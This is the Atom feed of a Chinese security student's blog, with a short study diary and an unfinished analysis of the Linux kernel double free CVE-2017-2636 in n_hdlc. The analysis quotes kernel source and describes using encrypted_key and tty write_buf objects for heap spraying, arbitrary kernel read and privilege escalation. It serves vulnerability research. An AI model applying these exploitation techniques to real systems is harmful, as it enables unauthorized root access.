<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ssj&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/Cracke-S-J/"/>
  <updated>2020-03-20T05:49:49.669Z</updated>
  <id>https://github.com/Cracke-S-J/</id>
  
  <author>
    <name>ssj</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ssj 每日流水账</title>
    <link href="https://github.com/Cracke-S-J/2220/03/18/%E6%B5%81%E6%B0%B4%E8%B4%A6/"/>
    <id>https://github.com/Cracke-S-J/2220/03/18/%E6%B5%81%E6%B0%B4%E8%B4%A6/</id>
    <published>2220-03-18T15:38:53.000Z</published>
    <updated>2020-03-20T05:49:49.669Z</updated>
    
    <content type="html"><![CDATA[<p>看到 dyf 分享的<a href="http://eternalsakura13.com/" target="_blank" rel="noopener">这位大佬</a>的博客，感觉计流水账挺有意思的，决定仿（抄）照（袭）也写一下。</p><hr><h2 id="2020-3-19"><a href="#2020-3-19" class="headerlink" title="2020-3-19"></a>2020-3-19</h2><ol><li>看了一道 ROP 的 pwn 题，学到 pwntools 可以用 shutdown 跳出循环（还不知道原理），在 .data 段看到了 flag，用 open 打开文件直接把 flag 读出来，发现学堆学傻了，ROP 操作起来好麻烦，一个算错当场死亡。</li><li>把简历顺了一遍，相关知识点、文章看了一下，发现自己是真的菜，还有看东西记不住。整理了面试相关知识点，以后还要维护和补充。</li><li>把 kernel 环境搭起来了，提权是真的爽。</li><li>工作上 review 了填词，结果还不错；跟 n 师傅吵着把 gui 修完了。“能不能一次稳稳当当地把一件事干好，不要以活多为理由做不好，到头来还是浪费了自己和大家时间。”</li><li>继续看各种文章，打算酝酿一篇分析 CVE 的博客，看起来劳资也是分析过 CVE 的。</li><li>看 70 页操作系统，准备看计算机网络。</li><li>不要因为看东西不动手，动手包括分析漏洞和写代码，不能停止写代码。（明天要看看那个编译器）</li></ol><h2 id="2020-3-18"><a href="#2020-3-18" class="headerlink" title="2020-3-18"></a>2020-3-18</h2><ol><li>看了一道 noleak 的 pwn 题，应该是学会这种操作了，但是把 pwndbg 搞崩了很不爽。</li><li>把 Excel 修好了（太难了），原来是账号登的不合微软心意了，把之前填的词修改了一下。</li><li>把 华为 和 阿里 和 字跳 的信息填了，简历投出去了，并且对着空虚的简历自闭了好长时间。（字跳效率是真的高，立马 hr 来电话，然后简历就过审了）</li><li>做了阿里的测评题，傻逼一个，无疑。</li><li>把 计算机模拟、计算机翻译、数值计算的作业写了。</li><li>看了大约 50 页操作系统那个书。</li><li>又是碌碌无为的一天。</li></ol><p>“我一直记得这个学生，这个学生当时高考的时候就是这么被骗的，后来在一个学校待了四年，他一直认为他已经上完车补完票了，因为住在学校宿舍也有学生证，也有饭卡，一切都有，最后研也考上了，司法考试也考上了，最后没法领司法考试的证，因为学籍是假的，研究生也白考了，没学籍，如果你是这个学生你怎么办，我曾经教过的一个法考学生，他后来又花了一年半的时间，重新考自考，一年半的时候考完自考，再次考法考，又考上了，又考研，还考上了，所以这个学生让我很感动，就是很多时候你改变不了你所处的情景，你说绝大多数人碰到这种情况，那一定是怨天尤人对吧，但是你在这种情况下你要怎么办，你只能勇敢的面对，你所出现的情景，并努力的利用现在的情景去改变，但怨天尤人是一种选择，但怨天尤人最后害的是谁呢，害的是你自己，但是还有另外一种就是勇敢的面对，你所处的不利的情况，去努力的应对，所以这个学生让我非常的感动，我时常想起他。这让我想起了古希腊哲学家爱比克泰德曾经说过的一句著名的话，他说我们登上并非我们所选择的舞台，演出并非我们所选择的剧本，各位同学有谁是自愿来到这个世界上的，有谁来到这个世界上父母征求过你的意见，没有征求过，我们登上并非我们所选择的舞台，各位同学有谁的人生剧本是你选择的，大家是不是很羡慕别人的剧本，老实说我有的时候也很羡慕别人的剧本，但是没有办法，你的剧本不是你选择的，你只有努力的把你的剧本给演好，虽然很痛苦，但是只要努力的演好你的剧本，在痛苦中也有精彩，也有精彩，每个人的人生剧本都是独特的，每个人的人生剧本都是精彩的，不要去羡慕别人，因为你没有可以羡慕的，人生中绝大多数说实施都不是你能决定的，人生95%的东西是我们决定不了的，我们的出生，我们的智商，我们一生的机遇，其实都不是我们所能决定的，这就是为什么，如果你真的取得了成就你应该感谢谁，是感谢你自己还是感谢你自己以外的力量，其实不应该感谢你自己，因为你能决定的东西很少，这就是为什么如果你真正取得了成就，你要积极的回报这个社会，因为给你的不一定真正属于你，大家想一想是不是，你的智商属于你吗，你的机会属于你吗，不一定，所以当你取得了成就，一定要积极的回馈这个世界。”——厚大法考，罗翔</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看到 dyf 分享的&lt;a href=&quot;http://eternalsakura13.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这位大佬&lt;/a&gt;的博客，感觉计流水账挺有意思的，决定仿（抄）照（袭）也写一下。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;2
      
    
    </summary>
    
    
      <category term="编程" scheme="https://github.com/Cracke-S-J/categories/programming/"/>
    
    
      <category term="学习记录" scheme="https://github.com/Cracke-S-J/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-2636 linux kernel dbf 分析</title>
    <link href="https://github.com/Cracke-S-J/2020/03/20/cve-2017-2636/"/>
    <id>https://github.com/Cracke-S-J/2020/03/20/cve-2017-2636/</id>
    <published>2020-03-20T02:15:57.000Z</published>
    <updated>2020-03-20T05:50:23.684Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在 <code>drivers/tty/n_hdlc.c</code> 中存在竞争条件，同一个对象可以两次被加入到一个将被 free 的链表中，然后导致 double free。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>kfree 在 free 一个指针后，该指针所指内容会被设为上一个被 free 的地址。也就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kfree(p1);</span><br><span class="line">kfree(p2);</span><br><span class="line">kfree(p2);</span><br><span class="line">kfree(p3);</span><br></pre></td></tr></table></figure><p>那么会得到 <code>*(unsigned long *)p2 = p2; *(unsigned long *)p3 = p2;</code>，两个可被重新申请的块的首地址相同，这时再 kmalloc：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kmalloc(sz, ...);</span><br><span class="line">kmalloc(sz, ...);</span><br></pre></td></tr></table></figure><p>可以得到指向同一空间的两个对象，当对象的大小可以被控制，就一个可以随意写入，一个可以包含指针。</p><p>下面分析 <code>kmalloc-8192, 内核版本3.10.x, cve-2017-2636</code>。</p><h2 id="encrypted-key"><a href="#encrypted-key" class="headerlink" title="encrypted key"></a>encrypted key</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *format;          <span class="comment">/* datablob: format */</span></span><br><span class="line">    <span class="keyword">char</span> *master_desc;     <span class="comment">/* datablob: master key name */</span></span><br><span class="line">    <span class="keyword">char</span> *datalen;         <span class="comment">/* datablob: decrypted key length */</span></span><br><span class="line">    u8 *iv;                <span class="comment">/* datablob: iv */</span></span><br><span class="line">    u8 *encrypted_data;    <span class="comment">/* datablob: encrypted data */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> datablob_len;           <span class="comment">/* length of datablob */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> decrypted_datalen;      <span class="comment">/* decrypted data length */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> payload_datalen;        <span class="comment">/* payload data length */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> encrypted_key_format;   <span class="comment">/* encrypted key format */</span></span><br><span class="line">    u8 *decrypted_data;    <span class="comment">/* decrypted data */</span></span><br><span class="line">    u8 payload_data[<span class="number">0</span>];    <span class="comment">/* payload data + datablob + hmac */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个结构体的大小是 0x48，下面看它是如何被申请的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct encrypted_key_payload *<span class="title">encrypted_key_alloc</span><span class="params">(struct key *key,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *format,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *master_desc,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="keyword">const</span> <span class="keyword">char</span> *datalen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    ret = kstrtol(datalen, <span class="number">10</span>, &amp;dlen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span> || dlen &lt; MIN_DATA_SIZE || dlen &gt; MAX_DATA_SIZE)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">    format_len = (!format) ? <span class="built_in">strlen</span>(key_format_default) : <span class="built_in">strlen</span>(format);</span><br><span class="line">    decrypted_datalen = dlen;</span><br><span class="line">    payload_datalen = decrypted_datalen;</span><br><span class="line">    <span class="keyword">if</span> (format &amp;&amp; !<span class="built_in">strcmp</span>(format, key_format_ecryptfs)) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    encrypted_datalen = roundup(decrypted_datalen, blksize);</span><br><span class="line"></span><br><span class="line">    datablob_len = format_len + <span class="number">1</span> + <span class="built_in">strlen</span>(master_desc) + <span class="number">1</span></span><br><span class="line">        + <span class="built_in">strlen</span>(datalen) + <span class="number">1</span> + ivsize + <span class="number">1</span> + encrypted_datalen;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 这个函数也比较重要 */</span></span><br><span class="line">    ret = key_payload_reserve(key, payload_datalen + datablob_len</span><br><span class="line">                  + HASH_SIZE + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 申请指定大小的对象 */</span></span><br><span class="line">    epayload = kzalloc(<span class="keyword">sizeof</span>(*epayload) + payload_datalen +</span><br><span class="line">               datablob_len + HASH_SIZE + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!epayload)</span><br><span class="line">        <span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">    epayload-&gt;payload_datalen = payload_datalen;</span><br><span class="line">    epayload-&gt;decrypted_datalen = decrypted_datalen;</span><br><span class="line">    epayload-&gt;datablob_len = datablob_len;</span><br><span class="line">    <span class="keyword">return</span> epayload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数利用方法是 <code>&quot;new default user:user_key_desc payload_len&quot;</code>。函数参数中的 format 指向 default，master_desc 指向 user:user_key_desc, datalen 指向 payload_len，payload 最大为 4096，也就是 encrypted_key_payload 对象最大的时候会取kmalloc-8192，最小的时候由于加上了 HASH_SIZE + 1, 所以最小 0x48 + 32 + 1 = 0x69。因此这个对象可以落在 kmalloc-128 - kmalloc-8192 的区域。</p><h2 id="使用-encrypted-key-的系统限制和策略"><a href="#使用-encrypted-key-的系统限制和策略" class="headerlink" title="使用 encrypted_key 的系统限制和策略"></a>使用 encrypted_key 的系统限制和策略</h2><p>在 <code>/proc/sys/kernel/keys/</code> 中，保存着当前系统普通用户能申请的 key 数以及总大小，限制了这个对象的喷的总数。在 encrypted_update 函数中，也调用了 encrypted_key_alloc 函数，然后会释放之前申请的空间，可以利用这个函数来进行交替堆喷。</p><p>encrypted_update 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">encrypted_update</span><span class="params">(struct key *key, struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span> = <span class="title">key</span>-&gt;<span class="title">payload</span>.<span class="title">data</span>[0];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">new_epayload</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">char</span> *new_master_desc = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (test_bit(KEY_FLAG_NEGATIVE, &amp;key-&gt;flags))</span><br><span class="line">        <span class="keyword">return</span> -ENOKEY;</span><br><span class="line">    <span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    buf = kmalloc(datalen + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!buf)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    buf[datalen] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, prep-&gt;data, datalen);</span><br><span class="line">    ret = datablob_parse(buf, &amp;format, &amp;new_master_desc, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* update的时候, 如果master_desc不匹配, 返回EINVAL */</span></span><br><span class="line">    ret = valid_master_desc(new_master_desc, epayload-&gt;master_desc);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 校验完成, 申请新的payload */</span></span><br><span class="line">    new_epayload = encrypted_key_alloc(key, epayload-&gt;format,</span><br><span class="line">                       new_master_desc, epayload-&gt;datalen);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(new_epayload)) &#123;</span><br><span class="line">        ret = PTR_ERR(new_epayload);</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __ekey_init(new_epayload, epayload-&gt;format, new_master_desc,</span><br><span class="line">            epayload-&gt;datalen);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_epayload-&gt;iv, epayload-&gt;iv, ivsize);</span><br><span class="line">    <span class="built_in">memcpy</span>(new_epayload-&gt;payload_data, epayload-&gt;payload_data,</span><br><span class="line">           epayload-&gt;payload_datalen);</span><br><span class="line"></span><br><span class="line">    rcu_assign_keypointer(key, new_epayload);</span><br><span class="line">    <span class="comment">/* 释放之前的payload */</span></span><br><span class="line">    call_rcu(&amp;epayload-&gt;rcu, encrypted_rcu_free);</span><br><span class="line">out:</span><br><span class="line">    kfree(buf);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用-encrypted-key-payload-来任意地址读"><a href="#用-encrypted-key-payload-来任意地址读" class="headerlink" title="用 encrypted_key_payload 来任意地址读"></a>用 encrypted_key_payload 来任意地址读</h2><p>在 double free 环境中，另外一个对象覆盖了 encrypted_key_payload 的数据。在 encrypted_read 函数中，会读取 <code>payload-&gt;format payload-&gt;master_desc payload-&gt;datalen payload-&gt;iv</code> 指向的数据。</p><p>下面是 encrypted_read 和 datablob_format：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">encrypted_read</span><span class="params">(<span class="keyword">const</span> struct key *key, <span class="keyword">char</span> __user *buffer,</span></span></span><br><span class="line"><span class="function"><span class="params">               <span class="keyword">size_t</span> buflen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">mkey</span>;</span></span><br><span class="line">    <span class="keyword">const</span> u8 *master_key;</span><br><span class="line">    <span class="keyword">size_t</span> master_keylen;</span><br><span class="line">    <span class="keyword">char</span> derived_key[HASH_SIZE];</span><br><span class="line">    <span class="keyword">char</span> *ascii_buf;</span><br><span class="line">    <span class="keyword">size_t</span> asciiblob_len;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">    epayload = rcu_dereference_key(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* returns the hex encoded iv, encrypted-data, and hmac as ascii */</span></span><br><span class="line">    asciiblob_len = epayload-&gt;datablob_len + ivsize + <span class="number">1</span></span><br><span class="line">        + roundup(epayload-&gt;decrypted_datalen, blksize)</span><br><span class="line">        + (HASH_SIZE * <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!buffer || buflen &lt; asciiblob_len)</span><br><span class="line">        <span class="keyword">return</span> asciiblob_len;</span><br><span class="line"></span><br><span class="line">    mkey = request_master_key(epayload, &amp;master_key, &amp;master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(mkey))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(mkey);</span><br><span class="line"></span><br><span class="line">    ret = get_derived_key(derived_key, ENC_KEY, master_key, master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ret = derived_key_encrypt(epayload, derived_key, <span class="keyword">sizeof</span> derived_key);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ret = datablob_hmac_append(epayload, master_key, master_keylen);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 读取所需数据到buf中 */</span></span><br><span class="line">    ascii_buf = datablob_format(epayload, asciiblob_len);</span><br><span class="line">    <span class="keyword">if</span> (!ascii_buf) &#123;</span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    up_read(&amp;mkey-&gt;sem);</span><br><span class="line">    key_put(mkey);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buffer, ascii_buf, asciiblob_len) != <span class="number">0</span>)</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    kfree(ascii_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> asciiblob_len;</span><br><span class="line">out:</span><br><span class="line">    up_read(&amp;mkey-&gt;sem);</span><br><span class="line">    key_put(mkey);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">datablob_format</span><span class="params">(struct encrypted_key_payload *epayload,</span></span></span><br><span class="line"><span class="function"><span class="params">                 <span class="keyword">size_t</span> asciiblob_len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ascii_buf, *bufp;</span><br><span class="line">    u8 *iv = epayload-&gt;iv;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    ascii_buf = kmalloc(asciiblob_len + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!ascii_buf)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    ascii_buf[asciiblob_len] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy datablob master_desc and datalen strings */</span></span><br><span class="line">    len = <span class="built_in">sprintf</span>(ascii_buf, <span class="string">"%s %s %s "</span>, epayload-&gt;format,</span><br><span class="line">              epayload-&gt;master_desc, epayload-&gt;datalen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* convert the hex encoded iv, encrypted-data and HMAC to ascii */</span></span><br><span class="line">    bufp = &amp;ascii_buf[len];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (asciiblob_len - len) / <span class="number">2</span>; i++)</span><br><span class="line">        bufp = hex_byte_pack(bufp, iv[i]);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> ascii_buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用-encrypted-key-提权"><a href="#用-encrypted-key-提权" class="headerlink" title="用 encrypted key 提权"></a>用 encrypted key 提权</h2><p>可以用这个清零实现提权（吗？）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">encrypted_destroy</span><span class="params">(struct key *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">encrypted_key_payload</span> *<span class="title">epayload</span> = <span class="title">key</span>-&gt;<span class="title">payload</span>.<span class="title">data</span>[0];</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!epayload)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(epayload-&gt;decrypted_data, <span class="number">0</span>, epayload-&gt;decrypted_datalen);</span><br><span class="line">    kfree(key-&gt;payload.data[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tty-struct-write-buf"><a href="#tty-struct-write-buf" class="headerlink" title="tty_struct.write_buf"></a>tty_struct.write_buf</h2><p>write_buf 成员在 do_tty_write 函数中申请, 默认长度为2048。</p><p>从代码里面可以看出，write_buf 的大小也是可控的，大小[2048, 65536]。搜索代码，得到 TTY_NO_WRITE_SPLIT 标志在 n_hdlc.c 中有路径会将其置位。而 write_buf 指向的空间数据可以通过 write 系统调用来实现。</p><p>PS: 用 open 打开 tty 时需要加上 O_NONBLOCK 标志。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> ssize_t <span class="title">do_tty_write</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">ssize_t</span> (*write)(struct 